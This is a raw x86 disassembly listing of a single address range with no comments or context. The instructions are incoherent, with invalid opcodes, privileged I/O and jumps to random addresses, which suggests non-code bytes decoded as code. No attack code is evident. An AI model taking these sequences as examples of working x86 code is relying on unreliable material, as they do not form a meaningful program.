  40d006:	bound  esi,QWORD PTR [eax+0x5789615d]
  40d00c:	inc    edi
  40d00d:	mov    dl,0xe9
  40d00f:	jl     0x40d08d
  40d011:	pop    es
  40d012:	pop    edi
  40d013:	jl     0x40d091
  40d015:	out    dx,eax
  40d016:	mul    DWORD PTR [esi+0x14]
  40d019:	xor    ecx,DWORD PTR [ebx]
  40d01b:	push   0xffffff8c
  40d01d:	fdiv   QWORD PTR [eax+0x25df4f6b]
  40d023:	inc    esi
  40d024:	dec    ebp
  40d025:	test   BYTE PTR [ebx+0x46],bl
  40d028:	out    0x7d,al
  40d02a:	xchg   ebp,eax
  40d02b:	call   0xb2b1bc34
  40d030:	leave  
  40d031:	xor    dh,cl
  40d033:	fcomp  DWORD PTR [ecx-0x50]
  40d036:	pop    edi
  40d037:	jmp    0x40d027
  40d039:	cmc    
  40d03a:	mov    WORD PTR [esi-0x67bdda56],fs
  40d040:	popf   
  40d041:	cmp    DWORD PTR [edx],edi
  40d043:	in     al,0x9b
  40d045:	ss in  eax,dx
  40d047:	imul   DWORD PTR [edx+0x58a8b72d]
  40d04d:	mov    cl,0x90
  40d04f:	cmc    
  40d050:	(bad)  ds:0x7e08323c
  40d056:	out    dx,eax
  40d057:	outs   dx,DWORD PTR ds:[esi]
  40d058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d059:	mov    WORD PTR [edi],?
  40d05b:	in     al,dx
  40d05c:	outs   dx,DWORD PTR ds:[esi]
  40d05d:	jo     0x40cfe0
  40d05f:	push   esp
  40d060:	cmp    eax,0x981ed277
  40d065:	aam    0x1
  40d067:	clc    
  40d068:	retf   
  40d069:	test   BYTE PTR [ebx],ah
  40d06b:	(bad)  [edi+edi*8+0x20102aab]
  40d072:	gs cdq 
  40d074:	or     DWORD PTR [edx-0x648086ba],eax
  40d07a:	outs   dx,BYTE PTR ds:[esi]
  40d07b:	je     0x40d0b4
  40d07d:	cmp    al,0x88
  40d07f:	adc    al,0x63
  40d081:	js     0x40d031
  40d083:	into   
  40d084:	sbb    ebp,DWORD PTR [esi+0x34bcab54]
  40d08a:	cli    
  40d08b:	pop    esi
  40d08c:	and    al,0x9c
  40d08e:	sub    al,BYTE PTR [ebp-0x4b]
  40d091:	push   esp
  40d092:	retf   
  40d093:	hlt    
  40d094:	push   edi
  40d095:	cs pusha 
  40d097:	aam    0x68
  40d099:	sbb    DWORD PTR [ebp+0x73],ebp
  40d09c:	dec    edx
  40d09d:	cs push ecx
  40d09f:	push   ds
  40d0a0:	and    bh,BYTE PTR [ebp-0x3dde06b7]
  40d0a6:	add    esp,ebx
  40d0a8:	adc    dl,ch
  40d0aa:	gs jecxz 0x40d0d3
  40d0ad:	and    ecx,esi
  40d0af:	repz cs pop esp
  40d0b2:	jne    0x40d065
  40d0b4:	iret   
  40d0b5:	jno    0x40d085
  40d0b7:	in     al,0x4c
  40d0b9:	pop    es
  40d0ba:	or     DWORD PTR [edi+0x69],0x15
  40d0be:	mov    edi,edx
  40d0c0:	scas   eax,DWORD PTR es:[edi]
  40d0c1:	call   0x169cbf4c
  40d0c6:	xor    dh,BYTE PTR [edx]
  40d0c8:	sti    
  40d0c9:	jp     0x40d126
  40d0cb:	addr16 rol ah,cl
  40d0ce:	xor    ebx,DWORD PTR [edi-0x62]
  40d0d1:	mov    dl,0x9d
  40d0d3:	pop    eax
  40d0d4:	xor    dl,BYTE PTR [edx]
  40d0d6:	jle    0x40d086
  40d0d8:	aas    
  40d0d9:	aam    0x9b
  40d0db:	dec    esp
  40d0dc:	pop    edx
  40d0dd:	ret    
  40d0de:	loopne 0x40d095
  40d0e0:	or     al,0x30
  40d0e2:	es retf 0x3a39
  40d0e6:	aaa    
  40d0e7:	mov    dh,0x70
  40d0e9:	not    BYTE PTR [edx]
  40d0eb:	dec    ebp
  40d0ec:	ror    BYTE PTR [ebx+edi*8-0x230dd45d],1
  40d0f3:	mov    ebp,0x22de558f
  40d0f8:	push   ecx
  40d0f9:	push   esp
  40d0fa:	sbb    bl,0xbe
  40d0fd:	cmp    al,0xeb
  40d0ff:	cmc    
  40d100:	pop    ebp
  40d101:	hlt    
  40d102:	fld    DWORD PTR ss:[ebp+0x63]
  40d106:	and    edi,esi
  40d108:	pop    ss
  40d109:	shl    DWORD PTR [ebp-0x5e06b1ad],0x6c
  40d110:	ficomp DWORD PTR [edi+0x33509f64]
  40d116:	jb     0x40d194
  40d118:	in     eax,dx
  40d119:	aas    
  40d11a:	fimul  DWORD PTR [eax-0x22]
  40d11d:	pop    ecx
  40d11e:	sub    DWORD PTR [eax+0x6d],0x1a
  40d122:	xor    BYTE PTR [eax-0x577899a1],dh
  40d128:	push   esp
  40d129:	aaa    
  40d12a:	cmp    cl,BYTE PTR [edx]
  40d12c:	jo     0x40d0e7
  40d12e:	shl    DWORD PTR [esi-0x33788422],cl
  40d134:	int3   
  40d135:	cmp    DWORD PTR [edi],ecx
  40d137:	mov    cl,0x90
  40d139:	out    dx,al
  40d13a:	retf   
  40d13b:	ficom  DWORD PTR [eax]
  40d13d:	dec    ecx
  40d13e:	fiadd  WORD PTR [ecx+0x567b94de]
  40d144:	cs xor eax,0x4acfb434
  40d14a:	mov    cl,BYTE PTR [edi+0x5d]
  40d14d:	test   eax,0x10e82cd8
  40d152:	mov    ds:0xfa1cb865,al
  40d157:	popf   
  40d158:	scas   al,BYTE PTR es:[edi]
  40d159:	or     edi,DWORD PTR [ecx-0x27]
  40d15c:	ins    DWORD PTR es:[edi],dx
  40d15d:	dec    ebp
  40d15e:	(bad)  
  40d160:	mov    gs,ecx
  40d162:	fisubr DWORD PTR ds:0x9de2c683
  40d168:	pop    eax
  40d169:	and    eax,DWORD PTR [eax]
  40d16b:	jno    0x40d11a
  40d16d:	popa   
  40d16e:	pushf  
  40d16f:	out    dx,eax
  40d170:	inc    eax
  40d171:	mov    esi,0x9083b631
  40d176:	cwde   
  40d177:	ret    
  40d178:	rcr    DWORD PTR [edi+eax*8],0xba
  40d17c:	(bad)  
  40d17d:	mov    BYTE PTR [eax+0x64996b4f],bl
  40d183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d184:	xchg   ebp,eax
  40d185:	mov    ah,0x37
  40d187:	or     eax,ebp
  40d189:	loopne 0x40d1ae
  40d18b:	fidiv  WORD PTR [eax+edx*2]
  40d18e:	jg     0x40d11d
  40d190:	dec    ebp
  40d191:	call   0xd5c8:0xebdd6fc7
  40d198:	xchg   esp,eax
  40d199:	sub    DWORD PTR ds:0x684d6ca4,0x15228af6
  40d1a3:	lods   eax,DWORD PTR ds:[esi]
  40d1a4:	fild   QWORD PTR [ebx]
  40d1a6:	cmp    DWORD PTR [edx],ebp
  40d1a8:	adc    DWORD PTR [ebx+0x7db84b1c],esi
  40d1ae:	(bad)  
  40d1b0:	or     DWORD PTR [eax],ecx
  40d1b2:	bound  edx,QWORD PTR [edx+0x2]
  40d1b5:	arpl   WORD PTR [esi-0x678311],si
  40d1bb:	sbb    ch,bl
  40d1bd:	push   ds
  40d1be:	xor    DWORD PTR [edi],eax
  40d1c0:	pop    edx
  40d1c1:	mov    ah,bl
  40d1c3:	push   edx
  40d1c4:	clc    
  40d1c5:	jp     0x40d1b5
  40d1c7:	fisttp WORD PTR [ecx-0x68]
  40d1ca:	dec    edx
  40d1cb:	fdivr  st,st(6)
  40d1cd:	call   0x2270e3b9
  40d1d2:	sub    al,0xe
  40d1d4:	sbb    BYTE PTR [esi+0x41],0x7b
  40d1d8:	fs (bad) 
  40d1da:	ficomp WORD PTR [ebx-0x7c]
  40d1dd:	fxch   st(1)
  40d1df:	add    DWORD PTR [esi-0x109b73a7],ebx
  40d1e5:	mov    bh,0x20
  40d1e7:	outs   dx,BYTE PTR ds:[esi]
  40d1e8:	loop   0x40d25c
  40d1ea:	sbb    ah,dl
  40d1ec:	push   es
  40d1ed:	loope  0x40d1d0
  40d1ef:	jae    0x40d1f5
  40d1f1:	cdq    
  40d1f2:	mov    al,ds:0x9ec3e7c0
  40d1f7:	shr    esp,cl
  40d1f9:	std    
  40d1fa:	(bad)  
  40d1fb:	mov    eax,0x8c477f41
  40d200:	push   es
  40d201:	outs   dx,BYTE PTR ds:[esi]
  40d202:	xchg   DWORD PTR [edi],eax
  40d204:	cmc    
  40d205:	pop    edi
  40d206:	and    edi,DWORD PTR [eax+0x25]
  40d209:	mov    esp,0x519e5bf
  40d20e:	sbb    ecx,DWORD PTR [edi-0x37be7bab]
  40d214:	dec    edi
  40d215:	sahf   
  40d216:	retf   0x165d
  40d219:	std    
  40d21a:	popf   
  40d21b:	out    0xbd,eax
  40d21d:	sub    BYTE PTR [ecx+esi*8+0x4b67e02e],dh
  40d224:	pop    ds
  40d225:	into   
  40d226:	(bad)
  40d22a:	(bad)  
  40d22b:	jno    0x40d222
  40d22d:	nop
  40d22e:	and    esi,DWORD PTR [esi+0x5e4d12c6]
  40d234:	mov    eax,ds:0x8d1aeb54
  40d239:	mov    BYTE PTR [edx],bh
  40d23b:	call   0x9a556e12
  40d240:	pusha  
  40d241:	sahf   
  40d242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d243:	sub    eax,DWORD PTR [ebp-0x3b1451f8]
  40d249:	mov    ds:0xc20e97a,al
  40d24e:	imul   edi,edx,0xffffffca
  40d251:	sub    cl,BYTE PTR [edx+0x38d03873]
  40d257:	call   0xf65643b3
  40d25c:	iret   
  40d25d:	mov    dl,0xd8
  40d25f:	div    DWORD PTR [ebp-0x334c2d35]
  40d265:	pushf  
  40d266:	cmp    DWORD PTR [ecx+0x18],ebx
  40d269:	mov    esi,0x6e193619
  40d26e:	test   DWORD PTR [esi],ecx
  40d270:	int3   
  40d271:	pop    ebp
  40d272:	arpl   WORD PTR [eax+0x291462c0],sp
  40d278:	call   0xc4096651
  40d27d:	jmp    0xd8ce:0x6ccc498e
  40d284:	xchg   edi,esp
  40d286:	jl     0x40d2f2
  40d288:	std    
  40d289:	xchg   esi,eax
  40d28a:	clc    
  40d28b:	dec    edx
  40d28c:	in     eax,dx
  40d28d:	pop    eax
  40d28e:	sub    ebp,DWORD PTR [eax+0x4e]
  40d291:	ret    0xed61
  40d294:	jne    0x40d21b
  40d296:	test   esi,edx
  40d298:	fbstp  TBYTE PTR ds:0x5cf495ce
  40d29e:	fcom   DWORD PTR [eax+0xf]
  40d2a1:	sbb    cl,al
  40d2a3:	js     0x40d256
  40d2a5:	adc    eax,0xb5679abb
  40d2aa:	mov    cl,0xe1
  40d2ac:	push   ds
  40d2ad:	aad    0x2a
  40d2af:	mov    eax,0xb6d8a88a
  40d2b4:	adc    edi,edi
  40d2b6:	sub    al,0x84
  40d2b8:	add    eax,0x137d8aff
  40d2bd:	aas    
  40d2be:	push   edi
  40d2bf:	fiadd  WORD PTR [esi+0x66]
  40d2c2:	or     dl,BYTE PTR es:[esi-0xff1d9ab]
  40d2c9:	(bad)  
  40d2ca:	xlat   BYTE PTR ds:[ebx]
  40d2cb:	sub    DWORD PTR [ecx-0x8],esp
  40d2ce:	push   0xffffff89
  40d2d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2d1:	imul   ecx,DWORD PTR [ecx],0x9d2194cd
  40d2d7:	sbb    BYTE PTR [edi],bh
  40d2d9:	test   ch,ah
  40d2db:	adc    dl,dh
  40d2dd:	and    BYTE PTR [ebx+eax*4-0x2d072a58],al
  40d2e4:	outs   dx,DWORD PTR ds:[esi]
  40d2e5:	int3   
  40d2e6:	adc    eax,0x4dd221e8
  40d2eb:	dec    ecx
  40d2ec:	ja     0x40d2e3
  40d2ee:	call   0xd62e87f2
  40d2f3:	arpl   sp,cx
  40d2f5:	jg     0x40d344
  40d2f7:	xor    DWORD PTR [ebx-0x7e],ebp
  40d2fa:	fild   WORD PTR [edi+0x78]
  40d2fd:	(bad)  
  40d2fe:	pop    ds
  40d2ff:	cs mov edx,0x950d552c
  40d305:	dec    esp
  40d306:	push   esp
  40d307:	push   eax
  40d308:	(bad)  
  40d309:	fnstenv [ebx+0x252d2fd2]
  40d30f:	les    edx,FWORD PTR [ecx+esi*4]
  40d312:	xor    al,0xc3
  40d314:	dec    esp
  40d315:	pushf  
  40d316:	fsub   QWORD PTR [ebp-0x105edac9]
  40d31c:	xchg   DWORD PTR [esp+eiz*8],ebp
  40d31f:	and    DWORD PTR [esi-0xd44fd9e],edx
  40d325:	or     eax,esi
  40d327:	scas   al,BYTE PTR es:[edi]
  40d328:	neg    bl
  40d32a:	ja     0x40d2c5
  40d32c:	xlat   BYTE PTR ds:[ebx]
  40d32d:	jns    0x40d361
  40d32f:	retf   0xa4e5
  40d332:	lock cdq 
  40d334:	in     eax,0x29
  40d336:	ins    DWORD PTR es:[edi],dx
  40d337:	in     al,dx
  40d338:	dec    ebp
  40d339:	mov    eax,DWORD PTR [ecx-0x71]
  40d33c:	sub    eax,0xc7dcbc26
  40d341:	xor    ch,ch
  40d343:	xlat   BYTE PTR ds:[ebx]
  40d344:	or     DWORD PTR [eax],esi
  40d346:	das    
  40d347:	ins    BYTE PTR es:[edi],dx
  40d348:	xchg   ecx,eax
  40d349:	lock popa 
  40d34b:	cld    
  40d34c:	fucom  st(2)
  40d34e:	push   edi
  40d34f:	mov    eax,0xf04b1749
  40d354:	icebp  
  40d355:	fdiv   QWORD PTR [esi-0x29ccbcea]
  40d35b:	dec    esi
  40d35c:	rcr    DWORD PTR [esi-0x6c],0x11
  40d360:	cmp    al,0x52
  40d362:	push   eax
  40d363:	ds dec ebp
  40d365:	lea    ebx,[ebp+0xe]
  40d368:	sub    al,0x84
  40d36a:	inc    esi
  40d36b:	aad    0x2b
  40d36d:	cli    
  40d36e:	and    BYTE PTR [ebx-0x39],dl
  40d371:	scas   eax,DWORD PTR es:[edi]
  40d372:	dec    eax
  40d373:	sbb    DWORD PTR [esi],ecx
  40d375:	pop    es
  40d376:	jne    0x40d38d
  40d378:	add    al,0x9d
  40d37a:	sub    al,0x6f
  40d37c:	pop    ecx
  40d37d:	dec    edi
  40d37e:	dec    ebp
  40d37f:	out    0x50,al
  40d381:	mov    eax,0x66844edd
  40d386:	sbb    DWORD PTR [ebx+0x549991bb],esi
  40d38c:	into   
  40d38d:	popf   
  40d38e:	mov    eax,ds:0x865209ca
  40d393:	cmp    eax,0xe99033ad
  40d398:	xchg   esi,eax
  40d399:	stos   DWORD PTR es:[edi],eax
  40d39a:	fidivr DWORD PTR [edx+0x43]
  40d39d:	lea    esi,[ebx]
  40d39f:	sub    BYTE PTR [edx],ch
  40d3a1:	fidivr DWORD PTR [ebx-0x4f]
  40d3a4:	mov    DWORD PTR [ebp+edi*1-0x78bc1f6c],eax
  40d3ab:	outs   dx,BYTE PTR ds:[esi]
  40d3ac:	stc    
  40d3ad:	jmp    0xb65396c9
  40d3b2:	sbb    BYTE PTR [ecx+0x1b],al
  40d3b5:	xchg   ebp,eax
  40d3b6:	mov    BYTE PTR [edi+0x42a722cf],ch
  40d3bc:	repz mov ecx,0x201f0344
  40d3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3c3:	dec    DWORD PTR [ebp+0x1f8c2015]
  40d3c9:	cs sti 
  40d3cb:	js     0x40d39f
  40d3cd:	pop    esp
  40d3ce:	aad    0x90
  40d3d0:	mov    ah,0x86
  40d3d2:	lods   eax,DWORD PTR ds:[esi]
  40d3d3:	pop    esi
  40d3d4:	ins    DWORD PTR es:[edi],dx
  40d3d5:	and    eax,0x2a62af6d
  40d3da:	mov    ebp,0x7bbeae34
  40d3df:	in     eax,dx
  40d3e0:	xchg   esp,eax
  40d3e1:	enter  0xecf9,0xb7
  40d3e5:	xlat   BYTE PTR ds:[ebx]
  40d3e6:	in     al,0x4a
  40d3e8:	pop    esp
  40d3e9:	sbb    al,BYTE PTR [esi+0x39064073]
  40d3ef:	mov    ds:0x2d06f3a5,eax
  40d3f4:	jmp    0x8b913c6b
  40d3f9:	int    0x86
  40d3fb:	dec    ebx
  40d3fc:	js     0x40d40f
  40d3fe:	icebp  
  40d3ff:	outs   dx,DWORD PTR ds:[esi]
  40d400:	pop    ds
  40d401:	(bad)  
  40d403:	fimul  DWORD PTR [edx]
  40d405:	inc    ebx
  40d406:	inc    ecx
  40d407:	or     DWORD PTR [ebx-0x75],ecx
  40d40a:	aaa    
  40d40b:	loopne 0x40d39c
  40d40d:	add    al,0xb5
  40d40f:	ja     0x40d487
  40d411:	in     al,dx
  40d412:	adc    eax,0xafe8691
  40d417:	add    esi,ebx
  40d419:	push   eax
  40d41a:	ins    DWORD PTR es:[edi],dx
  40d41b:	mov    fs,WORD PTR [ebx+0x35]
  40d41e:	(bad)  [eax+0x2dd8e5a2]
  40d424:	dec    esp
  40d425:	jl     0x40d3fb
  40d427:	ss push ecx
  40d429:	fld    TBYTE PTR [esi]
  40d42b:	pop    esi
  40d42c:	dec    eax
  40d42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d42e:	or     ecx,DWORD PTR [ecx]
  40d430:	cdq    
  40d431:	adc    eax,0xb3c397b9
  40d436:	or     DWORD PTR [ebx+0x21],edi
  40d439:	mov    al,0x1e
  40d43b:	aaa    
  40d43c:	sub    DWORD PTR [ebp-0x2e],esi
  40d43f:	or     eax,0xafc15284
  40d444:	or     bl,dh
  40d446:	xor    eax,DWORD PTR [ebx]
  40d448:	and    eax,0xbfa1a058
  40d44d:	popa   
  40d44e:	ficom  DWORD PTR [ecx]
  40d450:	push   esp
  40d451:	mov    ecx,0xb55f7130
  40d456:	jg     0x40d478
  40d458:	data16 fisub DWORD PTR [edx-0x75a54097]
  40d45f:	pusha  
  40d460:	pop    edi
  40d461:	paddq  mm0,QWORD PTR [ecx-0x2f]
  40d465:	and    al,dl
  40d467:	(bad)  
  40d468:	jnp    0x40d4cf
  40d46a:	cmp    eax,0x7aebb51
  40d46f:	hlt    
  40d470:	shr    BYTE PTR [eax],0x75
  40d473:	sub    edi,DWORD PTR [edi-0x602785b2]
  40d479:	jo     0x40d419
  40d47b:	iret   
  40d47c:	ror    DWORD PTR [edx+0x5862394d],0x60
  40d483:	pop    ss
  40d484:	call   0x5896e22
  40d489:	xor    eax,0xe304f641
  40d48e:	pop    ss
  40d48f:	jmp    0x40d428
  40d491:	or     eax,0x8b586530
  40d496:	jno    0x40d420
  40d498:	nop
  40d499:	push   0xffffff91
  40d49b:	and    al,0xab
  40d49d:	in     al,0x59
  40d49f:	or     DWORD PTR [edx-0x2b9c4782],esi
  40d4a5:	mov    ds:0xdf25bf02,eax
  40d4aa:	in     eax,0xe3
  40d4ac:	retf   
  40d4ad:	inc    esp
  40d4ae:	push   0xfa8105c5
  40d4b3:	(bad)  
  40d4b4:	in     al,dx
  40d4b5:	jo     0x40d4e5
  40d4b7:	xor    edi,DWORD PTR [edx-0x30]
  40d4ba:	out    0xc2,al
  40d4bc:	retf   
  40d4bd:	aaa    
  40d4be:	jmp    0x40d4ae
  40d4c0:	inc    edi
  40d4c1:	stc    
  40d4c2:	adc    ecx,ebp
  40d4c4:	in     al,0x57
  40d4c6:	add    DWORD PTR [esi+ecx*8+0x1ac8dc6b],esi
  40d4cd:	in     eax,0xd0
  40d4cf:	push   ds
  40d4d0:	mov    al,bh
  40d4d2:	lods   eax,DWORD PTR ds:[esi]
  40d4d3:	or     DWORD PTR [edx-0x52],esp
  40d4d6:	dec    edi
  40d4d7:	ret    
  40d4d8:	loop   0x40d51f
  40d4da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4db:	mov    bl,0x7
  40d4dd:	imul   eax,DWORD PTR [ebx],0xffffffcc
  40d4e0:	adc    eax,0xc5e39af2
  40d4e5:	ror    dh,cl
  40d4e7:	je     0x93ec3254
  40d4ed:	mov    dl,0x67
  40d4ef:	fadd   QWORD PTR [edx*2-0x2d3544e4]
  40d4f6:	cmp    al,0x5f
  40d4f8:	push   ss
  40d4f9:	sahf   
  40d4fa:	rcr    bh,0xdc
  40d4fd:	sub    eax,0x7a8345ac
  40d502:	lock std 
  40d504:	xor    ah,BYTE PTR [edx+0x26c8e6c0]
  40d50a:	push   ss
  40d50b:	push   edx
  40d50c:	mov    al,0x2a
  40d50e:	pop    edi
  40d50f:	xchg   DWORD PTR [edi],eax
  40d511:	add    al,0x31
  40d513:	mov    cl,BYTE PTR [esi-0x7c538fe2]
  40d519:	sub    DWORD PTR [ecx+0x44cbe1ff],esp
  40d51f:	add    eax,0x718b292f
  40d524:	icebp  
  40d525:	pop    ss
  40d526:	push   esp
  40d527:	mov    dh,0xfc
  40d529:	or     eax,0x73638679
  40d52e:	jo     0x40d58d
  40d530:	mov    DWORD PTR [edi+0x258a02e0],edx
  40d536:	push   ecx
  40d537:	xor    bh,0x22
  40d53a:	pop    edx
  40d53b:	pop    ss
  40d53c:	cli    
  40d53d:	mov    WORD PTR [ecx-0x36],ss
  40d540:	div    cl
  40d542:	sti    
  40d543:	iret   
  40d544:	out    0x37,eax
  40d546:	sbb    al,0x61
  40d548:	push   0x556132c2
  40d54d:	cmp    al,0x5
  40d54f:	push   cs
  40d550:	jno    0x40d565
  40d552:	in     al,dx
  40d553:	jb     0x40d501
  40d555:	dec    ebp
  40d556:	or     cl,BYTE PTR [esi+0x3a]
  40d559:	pop    ebx
  40d55a:	or     eax,0x7e5a2827
  40d55f:	pusha  
  40d560:	mov    BYTE PTR [ebx],dh
  40d562:	inc    esp
  40d563:	stos   BYTE PTR es:[edi],al
  40d564:	mov    esp,DWORD PTR ds:0xcd078631
  40d56a:	add    al,0xf
  40d56c:	push   esi
  40d56d:	sub    eax,0xe125ecf9
  40d572:	adc    esi,edx
  40d574:	loope  0x40d59b
  40d576:	xor    DWORD PTR [edx-0x4ed2f515],ebx
  40d57c:	gs push 0xbf9e3138
  40d582:	mov    bl,0x5f
  40d584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d585:	dec    edi
  40d586:	xor    cl,ah
  40d588:	mov    fs,esi
  40d58a:	into   
  40d58b:	outs   dx,BYTE PTR ds:[esi]
  40d58c:	not    DWORD PTR [ebp-0x47c7b69e]
  40d592:	add    eax,0x23e0240b
  40d597:	call   ebx
  40d599:	fld    DWORD PTR [esi-0x56]
  40d59c:	loopne 0x40d5f1
  40d59e:	ds in  al,0x1c
  40d5a1:	or     ebx,DWORD PTR [ebp-0xc7d461d]
  40d5a7:	or     BYTE PTR [edi+0x27d4b59f],dl
  40d5ad:	in     al,dx
  40d5ae:	into   
  40d5af:	jmp    0x470:0xf02d0cbd
  40d5b6:	or     edi,DWORD PTR [ebp+0x478928ab]
  40d5bc:	stos   BYTE PTR es:[edi],al
  40d5bd:	jge    0x40d5e7
  40d5bf:	adc    BYTE PTR ds:0xbd8ce7fc,cl
  40d5c5:	or     eax,0xaab01ad4
  40d5ca:	aam    0x77
  40d5cc:	jecxz  0x40d5fa
  40d5ce:	xchg   esp,eax
  40d5cf:	aas    
  40d5d0:	add    ebx,DWORD PTR [eax-0x6d098ac6]
  40d5d6:	ins    BYTE PTR es:[edi],dx
  40d5d7:	adc    esp,0x1c
  40d5da:	pop    ecx
  40d5db:	or     eax,0xbdcf0ba6
  40d5e0:	(bad)  
  40d5e1:	out    0x6a,al
  40d5e3:	int    0xf1
  40d5e5:	test   BYTE PTR gs:[edi-0x23],cl
  40d5e9:	jns    0x40d627
  40d5eb:	push   esi
  40d5ec:	sub    DWORD PTR [edi+0x29fef01a],edx
  40d5f2:	mov    edi,0x45dbd6c0
  40d5f7:	adc    bh,bl
  40d5f9:	xor    DWORD PTR [eax+0x6a],ebx
  40d5fc:	ds mov ah,0xd9
  40d5ff:	cmp    DWORD PTR [ebx+0x418c348e],0xffffff99
  40d606:	push   0xffffffb8
  40d608:	pop    edi
  40d609:	adc    DWORD PTR [edx],esp
  40d60b:	mov    esp,ss
  40d60d:	push   0x3a
  40d60f:	mov    eax,ds:0x68ad38a9
  40d614:	xor    al,0x5c
  40d616:	jl     0x40d5c8
  40d618:	fisubr DWORD PTR [edx]
  40d61a:	jle    0x40d618
  40d61c:	or     DWORD PTR [esi+ebp*1-0x36],edi
  40d620:	sub    ch,BYTE PTR [eax+0x3c9c9172]
  40d626:	shl    DWORD PTR [eax+0x65],1
  40d629:	test   BYTE PTR ds:0x3ea05466,bl
  40d62f:	cdq    
  40d630:	lds    edi,FWORD PTR [esi+0x79c63285]
  40d636:	retf   
  40d637:	mov    dl,0x59
  40d639:	cmc    
  40d63a:	push   ebx
  40d63b:	enter  0x1a89,0x22
  40d63f:	pop    ecx
  40d640:	push   es
  40d641:	jne    0x40d5e8
  40d643:	inc    edx
  40d644:	push   esi
  40d645:	mov    eax,0x18957f14
  40d64a:	xchg   edi,eax
  40d64b:	retf   0xdc4c
  40d64e:	cmp    dl,ah
  40d650:	push   esp
  40d651:	jnp    0x40d6bc
  40d653:	test   al,0xf5
  40d655:	or     al,0xc4
  40d657:	stc    
  40d658:	cld    
  40d659:	jmp    0x40d5db
  40d65b:	and    dl,cl
  40d65d:	sub    bl,al
  40d65f:	adc    ch,0x1b
  40d662:	pop    eax
  40d663:	jae    0x40d696
  40d665:	inc    edx
  40d666:	mov    al,ds:0x5d2c34bb
  40d66b:	dec    eax
  40d66c:	loop   0x40d67e
  40d66e:	jle    0x40d6a9
  40d670:	mov    dh,0xd3
  40d672:	cmp    DWORD PTR [ebp-0x7bb6c0c9],esi
  40d678:	adc    DWORD PTR [ebp-0x49],ebx
  40d67b:	xor    BYTE PTR [edx-0x27],dh
  40d67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d67f:	pop    edx
  40d680:	xor    BYTE PTR [ecx+0x62],cl
  40d683:	ins    BYTE PTR es:[edi],dx
  40d684:	jp     0x40d6d3
  40d686:	jle    0x40d63d
  40d688:	add    al,0xed
  40d68a:	cs dec edi
  40d68c:	das    
  40d68d:	sub    al,0xa1
  40d68f:	sub    bh,0xd4
  40d692:	mov    edx,0xf685ca6b
  40d697:	mov    edi,0x53eaf076
  40d69c:	cmp    dl,ah
  40d69e:	sub    DWORD PTR [eax-0x55],esi
  40d6a1:	or     al,0xfd
  40d6a3:	xor    ebx,DWORD PTR [ecx]
  40d6a5:	les    esp,FWORD PTR [edx-0x32e427cc]
  40d6ab:	dec    ecx
  40d6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6ad:	push   ecx
  40d6ae:	sbb    cl,BYTE PTR [eax+0x11]
  40d6b1:	inc    ebp
  40d6b2:	pop    ebx
  40d6b3:	pop    ebp
  40d6b4:	(bad)  
  40d6b5:	jg     0x40d6b3
  40d6b7:	fisubr WORD PTR [edi+0x45]
  40d6ba:	popf   
  40d6bb:	push   cs
  40d6bc:	mov    edx,0xc1029422
  40d6c1:	adc    bl,BYTE PTR [eax+0x4d8105e5]
  40d6c7:	mov    esi,0xebd792f7
  40d6cc:	sbb    BYTE PTR ds:0xe5555cca,dh
  40d6d2:	push   es
  40d6d3:	test   al,0x95
  40d6d5:	popf   
  40d6d6:	(bad)  
  40d6d8:	lock out dx,al
  40d6da:	add    eax,0x74d278d8
  40d6df:	in     eax,0x20
  40d6e1:	cld    
  40d6e2:	aad    0xe6
  40d6e4:	lahf   
  40d6e5:	jge    0x40d6af
  40d6e7:	pop    esp
  40d6e8:	out    0x12,eax
  40d6ea:	push   ds
  40d6eb:	mov    ds:0x9c845d60,eax
  40d6f0:	mov    esi,0x6bf32051
  40d6f5:	mov    al,0x89
  40d6f7:	sbb    BYTE PTR [ebx-0x1b671c9c],0x85
  40d6fe:	push   esi
  40d6ff:	mov    ch,0x76
  40d701:	js     0x40d698
  40d703:	adc    eax,0x1757e586
  40d708:	ss cmp eax,0xffa7af5
  40d70e:	or     BYTE PTR [ebp+0x384d93de],dl
  40d714:	push   es
  40d715:	fst    st(4)
  40d717:	mov    edx,0xdf59b497
  40d71c:	push   ebx
  40d71d:	sub    ecx,DWORD PTR [esp+esi*1+0x14]
  40d721:	lea    ecx,[ebx+0x24]
  40d724:	xor    edi,DWORD PTR ds:0x1713bbfb
  40d72a:	dec    ebp
  40d72b:	mov    eax,ds:0xb98eb1aa
  40d730:	mov    ecx,0xd91b5c3a
  40d735:	mov    ebp,0xfb44102f
  40d73a:	add    esi,0x65
  40d73d:	mov    esi,0x80fd4e36
  40d742:	out    0x52,eax
  40d744:	pushf  
  40d745:	mov    eax,ds:0x68c7addb
  40d74a:	pop    esp
  40d74b:	(bad)  
  40d74c:	(bad)  
  40d74d:	scas   eax,DWORD PTR es:[edi]
  40d74e:	sbb    esi,DWORD PTR [edi]
  40d750:	out    0x7b,eax
  40d752:	and    DWORD PTR [ebx+ecx*2],esp
  40d755:	scas   al,BYTE PTR es:[edi]
  40d756:	sbb    dh,al
  40d758:	outs   dx,DWORD PTR ds:[esi]
  40d759:	aaa    
  40d75a:	jle    0x40d7b4
  40d75c:	shr    BYTE PTR [edx],cl
  40d75e:	(bad)  
  40d75f:	imul   BYTE PTR [ebp-0x7a]
  40d762:	aaa    
  40d763:	jle    0x24f0393
  40d769:	push   cs
  40d76a:	push   ds
  40d76b:	pusha  
  40d76c:	jp     0x40d773
  40d76e:	jecxz  0x40d7b7
  40d770:	lods   eax,DWORD PTR ds:[esi]
  40d771:	std    
  40d772:	test   al,0x9
  40d774:	fisub  WORD PTR [ecx]
  40d776:	(bad)  
  40d777:	retf   0x105c
  40d77a:	cs sti 
  40d77c:	std    
  40d77d:	push   0x7d
  40d77f:	aam    0xf0
  40d781:	and    DWORD PTR [edi],eax
  40d783:	dec    ebp
  40d784:	ja     0x40d796
  40d786:	or     eax,ebp
  40d788:	jle    0x40d7b7
  40d78a:	xchg   edx,eax
  40d78b:	cmc    
  40d78c:	(bad)  
  40d78d:	pop    eax
